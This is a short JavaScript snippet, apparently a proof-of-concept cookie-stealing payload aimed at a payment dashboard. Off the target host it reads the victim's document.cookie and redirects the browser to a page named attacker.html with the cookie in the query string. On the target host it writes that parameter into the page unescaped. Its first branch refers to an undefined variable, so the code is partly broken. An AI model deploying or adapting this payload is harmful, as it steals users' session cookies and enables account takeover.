if(location.host == "dashboard.xendit.co"){ 
    Url = new URL(document.location); 
    Parameters = new URLSearchParams(x.search); 
    cookie = Parameters.get("cookie"); 
    document.write(cookie);
}
else{ 
    var cookie = document.cookie; 
document.location="https://dashboard.xendit.co/attacker.html?cookie="+cookie;
}